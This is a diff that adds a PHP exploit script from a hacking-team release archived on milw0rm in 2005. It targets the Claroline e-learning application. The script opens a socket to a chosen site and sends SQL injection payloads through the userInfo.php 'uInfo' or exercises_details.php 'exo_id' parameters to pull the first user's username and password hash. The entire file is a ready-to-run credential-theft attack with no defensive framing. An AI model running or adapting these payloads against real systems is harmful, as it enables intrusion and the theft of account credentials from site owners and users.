@@ -1,0 +1,66 @@
+<?php
+#############################################################################
+#    T r a p - S e t   U n d e r g r o u n d   H a c k i n g   T e a m
+#############################################################################
+# Vulnerable:   Claroline E-Learning Application
+#
+# Exploit By :  MH_p0rtal
+#
+# Discovered By: Sieg Fried
+#
+#############################################################################
+#  Gr33tz To ==>   Alpha_programmer , Oil_karchack , Dr_CephaleX , Str0ke
+#
+#  And Iranian Hacking & Security Teams :
+#  IHS TeaM , alphaST , Shabgard Security Team  , Emperor Hacking Team  ,
+#  Crouz Security Team  & Simorgh-ev Security Team
+#############################################################################
+# ___________Config :
+# please replace your address :
+$url = "http:///www.example.com";
+# Please replace your name file  ( userInfo.php Or  exercises_details.php )
+$file1 = "userInfo.php";
+# please replace your dir address :
+$dirs = "/dir/to/claroline/user/";
+# __________End Config
+#############################################################################
+if ( $file1 == "userInfo.php" ) {
+$merg = $dirs.$file1;
+$fc = fsockopen("$url", 80, $errno, $errstr, 30);
+if (!$fc) {
+
+echo "Can't Connect\n";
+} else {
+   $mh = "GET $merg?uInfo=-1%20UNION%20SELECT%20username,password,0,0,0,0,0%20from%20user%20where%20user_id=1/*  HTTP/1.1\r\n";
+   $mh .= "Host: $url\r\n";
+   $mh .= "Connection: Close\r\n\r\n";
+
+  fwrite($fc, $mh);
+  while (!feof($fc)) {
+  echo fgets($fc, 1024);
+  }
+   fclose($fc);
+}
+}
+//-------------------------------------------------------------------------------------------
+if ( $file1 == "exercises_details.php" ) {
+$merg = $dirs.$file1;
+$fc = fsockopen("$url", 80, $errno, $errstr, 30);
+if (!$fc) {
+
+echo "Can't Connect\n";
+} else {
+   $mh = "GET $merg?exo_id=-1/**/UNION/**/SELECT%200,password,username,0,0,0%20from%20user%20where%20user_id=1--  HTTP/1.1\r\n";
+   $mh .= "Host: $url\r\n";
+   $mh .= "Connection: Close\r\n\r\n";
+
+  fwrite($fc, $mh);
+  while (!feof($fc)) {
+  echo fgets($fc, 1024);
+  }
+   fclose($fc);
+}
+}
+?>
+
+// milw0rm.com [2005-06-17]
